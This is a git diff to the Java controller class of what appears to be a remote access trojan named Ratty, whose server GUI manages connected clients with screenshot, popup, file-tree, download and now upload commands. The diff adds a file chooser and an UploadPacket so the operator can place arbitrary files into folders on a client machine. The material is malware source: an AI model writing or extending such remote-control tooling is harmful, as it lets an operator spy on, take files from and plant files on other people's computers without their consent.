@@ -1,7 +1,10 @@
 package de.sogomn.rat.server.gui;
 
 import java.awt.image.BufferedImage;
+import java.io.File;
 import java.util.ArrayList;
+
+import javax.swing.JFileChooser;
 
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
@@ -15,6 +18,7 @@ import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
+import de.sogomn.rat.packet.UploadPacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 import de.sogomn.rat.util.FrameEncoder.IFrame;
@@ -22,6 +26,7 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
 public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
 	
 	private RattyGui gui;
+	private JFileChooser fileChooser;
 	
 	private ArrayList<ServerClient> clients;
 	private long nextId;
@@ -29,6 +34,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	public RattyGuiController(final RattyGui gui) {
 		this.gui = gui;
 		
+		fileChooser = new JFileChooser();
 		clients = new ArrayList<ServerClient>();
 		
 		gui.setController(this);
@@ -54,6 +60,16 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		return null;
 	}
 	
+	private File chooseFile() {
+		final int input = fileChooser.showOpenDialog(null);
+		
+		if (input == JFileChooser.APPROVE_OPTION) {
+			return fileChooser.getSelectedFile();
+		}
+		
+		return null;
+	}
+	
 	private IPacket getPacket(final String command, final ServerClient serverClient) {
 		if (command == RattyGui.POPUP) {
 			return PopupPacket.create();
@@ -72,6 +88,8 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final String path = treePanel.getLastPathClicked();
 			final FileSystemPacket packet = new FileSystemPacket(path);
 			
+			treePanel.removeFile(path);
+			
 			return packet;
 		} else if (command == FileTreePanel.DOWNLOAD) {
 			final FileTreePanel treePanel = serverClient.getTreePanel();
@@ -79,6 +97,17 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final DownloadPacket packet = new DownloadPacket(path);
 			
 			return packet;
+		} else if (command == FileTreePanel.UPLOAD) {
+			final File file = chooseFile();
+			
+			if (file != null) {
+				final String localPath = file.getAbsolutePath();
+				final FileTreePanel treePanel = serverClient.getTreePanel();
+				final String path = treePanel.getLastNodeClickedFolder();
+				final UploadPacket packet = new UploadPacket(localPath, path);
+				
+				return packet;
+			}
 		}
 		
 		return null;
@@ -103,8 +132,8 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private void handle(final ServerClient serverClient, final FileSystemPacket packet) {
-		final String[] paths = packet.getPaths();
 		final FileTreePanel treePanel = serverClient.getTreePanel();
+		final String[] paths = packet.getPaths();
 		
 		for (final String path : paths) {
 			treePanel.addFile(path);
